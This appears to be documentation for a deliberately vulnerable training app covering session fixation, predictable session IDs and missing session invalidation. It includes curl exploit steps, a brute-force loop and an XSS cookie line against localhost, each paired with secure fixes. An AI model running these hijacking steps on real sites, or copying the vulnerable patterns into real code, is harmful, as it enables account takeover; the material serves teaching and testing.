# Session Management Vulnerabilities

> [!WARNING]
> **HIGH SEVERITY VULNERABILITIES** - For educational/testing purposes only. Never use in production.

## Overview

Implemented **4 critical session management vulnerabilities** based on OWASP guidelines and real-world HackerOne reports. These flaws demonstrate common mistakes in session handling that can lead to session hijacking and account takeover.

---

## Vulnerabilities

### 1. Session Fixation

**Severity**: High  
**Source**: OWASP, HackerOne

**Vulnerability**: Session ID is not regenerated after login, allowing attacker to fix victim's session before authentication.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `loginSessionFixation()`

**How It Works**:
1. Attacker obtains a session ID (e.g., by visiting the site)
2. Attacker tricks victim into using that session ID
3. Victim logs in with the fixed session ID
4. Attacker uses the same session ID to access victim's account

**Exploit**:
```bash
# 1. Attacker gets a session ID
curl -c cookies.txt http://localhost:3000/api/jwt-session/login-session-fixation \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"wrong"}'

# Extract session ID from response or cookies
# SESSION_ID="SESSION-1234567890"

# 2. Attacker sends victim a link with fixed session
# http://victim-site.com/login?sessionId=SESSION-1234567890
# Or sets cookie via XSS: document.cookie="sessionId=SESSION-1234567890"

# 3. Victim logs in with the fixed session
curl -b "sessionId=SESSION-1234567890" \
  -X POST http://localhost:3000/api/jwt-session/login-session-fixation \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"victim_password"}'

# 4. Attacker uses the same session ID
curl -b "sessionId=SESSION-1234567890" \
  http://localhost:3000/api/jwt-session/session-data

# SUCCESS - Attacker is now authenticated as victim!
```

**Impact**: Account takeover, session hijacking.

**Secure Implementation**:
```typescript
export const loginSecure = async (req: Request, res: Response) => {
    // ... authentication logic ...
    
    // ALWAYS regenerate session ID after login
    const oldSessionId = req.cookies.sessionId;
    if (oldSessionId && sessions[oldSessionId]) {
        delete sessions[oldSessionId]; // Invalidate old session
    }
    
    // Generate new, cryptographically random session ID
    const newSessionId = crypto.randomBytes(32).toString('hex');
    sessions[newSessionId] = { userId: user.id };
    
    res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });
};
```

---

### 2. Predictable Session IDs

**Severity**: Critical  
**Source**: OWASP, Medium

**Vulnerability**: Session IDs generated with predictable sequential counter, allowing brute-force attacks.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `loginPredictableSession()`

**Exploit**:
```bash
# 1. Login and observe session ID pattern
curl -X POST http://localhost:3000/api/jwt-session/login-predictable-session \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password123"}'

# Response: {"sessionId":"SESSION-1000","hint":"Next session will be: SESSION-1001"}

# 2. Predict and brute-force session IDs
for i in {1000..1100}; do
  echo "Testing SESSION-$i"
  curl -b "sessionId=SESSION-$i" \
    http://localhost:3000/api/jwt-session/session-data
done

# Will find valid sessions for other users!
```

**Impact**: Session hijacking, account takeover of multiple users.

**Secure Implementation**:
```typescript
// Use cryptographically secure random session IDs
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');

// Minimum 128 bits of entropy
// Never use sequential counters, timestamps, or predictable patterns
```

---

### 3. No Session Invalidation on Logout

**Severity**: High  
**Source**: OWASP, HackerOne

**Vulnerability**: Sessions remain valid on the server after logout, only client-side cookie is cleared.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `logoutNoInvalidation()`

**Exploit**:
```bash
# 1. Login and save session ID
curl -c cookies.txt -X POST http://localhost:3000/api/jwt-session/login-session-fixation \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password123"}'

# Extract session ID
SESSION_ID=$(grep sessionId cookies.txt | awk '{print $7}')
echo "Session ID: $SESSION_ID"

# 2. Logout
curl -b "sessionId=$SESSION_ID" \
  -X POST http://localhost:3000/api/jwt-session/logout-no-invalidation

# Response: "Logged out" - cookie cleared client-side

# 3. Session still works!
curl -b "sessionId=$SESSION_ID" \
  http://localhost:3000/api/jwt-session/session-data

# SUCCESS - Still authenticated!
```

**Impact**: 
- Stolen session IDs remain valid indefinitely
- Shared computer attacks
- Session replay attacks

**Secure Implementation**:
```typescript
export const logoutSecure = async (req: Request, res: Response) => {
    const sessionId = req.cookies.sessionId;
    
    // Invalidate session server-side
    if (sessionId && sessions[sessionId]) {
        delete sessions[sessionId];
    }
    
    // Clear client-side cookie
    res.clearCookie('sessionId');
    res.json({ message: 'Logged out successfully' });
};
```

---

### 4. No Session Invalidation on Password Change

**Severity**: High  
**Source**: OWASP, Medium

**Vulnerability**: Existing sessions/tokens remain valid after password change, allowing stolen credentials to persist.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `changePasswordNoSessionInvalidation()`

**Exploit**:
```bash
# 1. Attacker steals JWT token or session ID
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"old_password"}'

# Save stolen token
STOLEN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. Victim discovers breach and changes password
curl -X POST http://localhost:3000/api/jwt-session/change-password-no-invalidation \
  -H "Authorization: Bearer $VICTIM_NEW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"currentPassword":"old_password","newPassword":"new_secure_password"}'

# 3. Stolen token STILL works!
curl -X GET http://localhost:3000/api/auth/me \
  -H "Authorization: Bearer $STOLEN_TOKEN"

# SUCCESS - Attacker retains access despite password change!
```

**Impact**: 
- Stolen credentials remain valid
- Attacker maintains persistent access
- Password change doesn't revoke compromised sessions

**Secure Implementation**:
```typescript
export const changePasswordSecure = async (req: Request, res: Response) => {
    // ... password validation ...
    
    // Update password
    await prisma.user.update({
        where: { id: userId },
        data: { 
            password: hashedPassword,
            // Increment token version to invalidate all existing JWTs
            tokenVersion: user.tokenVersion + 1
        }
    });
    
    // Invalidate all sessions for this user
    Object.keys(sessions).forEach(sessionId => {
        if (sessions[sessionId].userId === userId) {
            delete sessions[sessionId];
        }
    });
    
    res.json({ message: 'Password changed - all sessions invalidated' });
};
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/jwt-session/login-session-fixation` | POST | Session fixation |
| `/api/jwt-session/login-predictable-session` | POST | Predictable session IDs |
| `/api/jwt-session/logout-no-invalidation` | POST | No logout invalidation |
| `/api/jwt-session/change-password-no-invalidation` | POST | No password change invalidation |
| `/api/jwt-session/session-data` | GET | Test session validity |

---

## Testing Checklist

- [ ] Test session fixation attack flow
- [ ] Brute-force predictable session IDs
- [ ] Verify session persists after logout
- [ ] Verify session persists after password change
- [ ] Test session hijacking scenarios

---

## Secure Session Management Best Practices

1. **Regenerate session ID after login** - Prevent fixation attacks
2. **Use cryptographically random session IDs** - Minimum 128 bits entropy
3. **Invalidate sessions on logout** - Server-side deletion
4. **Invalidate all sessions on password change** - Force re-authentication
5. **Set secure cookie flags** - `httpOnly`, `secure`, `sameSite`
6. **Implement session timeout** - Absolute and idle timeouts
7. **Bind sessions to IP/User-Agent** - Additional validation (with care)
8. **Use HTTPS only** - Prevent session ID interception

---

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [HackerOne Session Management Reports](https://hackerone.com/reports?q=session)
